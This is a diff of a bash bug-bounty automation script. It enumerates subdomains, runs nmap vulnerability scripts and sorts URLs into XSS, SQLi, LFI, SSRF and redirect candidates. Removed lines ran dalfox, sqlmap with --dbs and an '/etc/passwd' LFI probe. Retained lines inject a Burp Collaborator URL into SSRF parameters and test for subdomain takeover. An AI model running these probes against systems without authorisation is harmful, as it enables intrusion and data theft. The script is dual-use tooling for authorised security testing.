@@ -30,13 +30,11 @@ SUBLIST3R=$(command -v sublist3r)
 HTTPX=$(command -v httpx)
 GF=$(command -v gf)
 GAU=$(command -v gau)
-DALFOX=$(command -v dalfox)
 QSREPLACE=$(command -v qsreplace)
 SUBJACK=$(command -v subjack)
 GOWITNESS=$(command -v gowitness)
 JSUBFINDER=$(command -v jsubfinder)
 NUCLEI=$(command -v nuclei)
-SQLMAP=$(command -v sqlmap)
 NMAP=$(command -v nmap)
 
 # Get large scope domain as first argument
@@ -65,14 +63,14 @@ then
     done
 fi
 
-# Check live subdomains
+# Check live subdomains and status code
 cat subdomains_$HOST.txt | $HTTPX -silent | tee live_subdomains_$HOST.txt
 
 # Scan with NMAP and Vulners
 if [ ! -z "$VULSCAN_NMAP_NSE" ]
 then
     $NMAP -Pn -sV -oN nmap_results_$HOST.txt -iL subdomains_$HOST.txt --script=$VULSCAN_NMAP_NSE -T2 --top-ports 1000
-    sed -i '/Failed to resolve/d' nmap_results_$HOST.txt # Remove lines fronm log for those subs that aren't up
+    sed -i '/Failed to resolve/d' nmap_results_$HOST.txt
 fi
 
 # Get screenshots of subdomains
@@ -107,44 +105,34 @@ fi
 
 # Extract urls with possible XSS params
 cat live_urls_$HOST.txt | $GF xss > xss_urls_$HOST.txt
-# Remove duplicates
 cat xss_urls_$HOST.txt | $QSREPLACE -a | tee xss_urls_$HOST.txt
 
 # Extract urls with possible SQLi params
 cat live_urls_$HOST.txt | $GF sqli > sqli_urls_$HOST.txt
-# Remove duplicates
 cat sqli_urls_$HOST.txt | $QSREPLACE -a | tee sqli_urls_$HOST.txt
 
 # Extract urls with possible LFI params
 cat live_urls_$HOST.txt | $GF lfi > lfi_urls_$HOST.txt
-# Remove duplicates
 cat lfi_urls_$HOST.txt | $QSREPLACE -a | tee lfi_urls_$HOST.txt
 
 # Extract urls with possible SSRF params
 cat live_urls_$HOST.txt | $GF ssrf > ssrf_urls_$HOST.txt
-# Remove duplicates
 cat ssrf_urls_$HOST.txt | $QSREPLACE -a | tee ssrf_urls_$HOST.txt
 
-# Run Dalfox on XSS urls
-echo "Running DALFOX.."
-$DALFOX file xss_urls_$HOST.txt -w 10 -S -o dalfox_XSS_$HOST.txt
-
-# Run SQLMAP on SQLi urls
-$SQLMAP -m sqli_urls_$HOST.txt --batch --random-agent --dbs -o sqlmap_$HOST
-
-# Test basic LFI vulnerability
-cat lfi_urls_$HOST.txt | $QSREPLACE "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -sk "%" 2>&1 | grep -q "root:x" && echo "VULNERABLE! %"' | tee lfi_vulnerable_urls_$HOST.txt
-
-# Test for basic SSRF using Burp Collaborator
-if [ ! -z "$BURP_COLLAB_URL" ]
-then
-    cat ssrf_urls_$HOST.txt | grep "=" | $QSREPLACE $BURP_COLLAB_URL
-fi
+# Extract urls with possible OPEN REDIRECT params
+cat live_urls_$HOST.txt | $GF redirect > redirect_urls_$HOST.txt
+cat redirect_urls_$HOST.txt | $QSREPLACE -a | tee redirect_urls_$HOST.txt
 
 # Search for subdomains takeover
 if [ ! -z "$FINGERPRINTS" ]
 then
     $SUBJACK -w subdomains_$HOST.txt -t 50 -timeout 25 -o sub_takeover_$HOST.txt -ssl -c $FINGERPRINTS -v
+fi
+
+# Test for basic SSRF using Burp Collaborator
+if [ ! -z "$BURP_COLLAB_URL" ]
+then
+    cat ssrf_urls_$HOST.txt | grep "=" | $QSREPLACE $BURP_COLLAB_URL
 fi
 
 # Save finish execution time
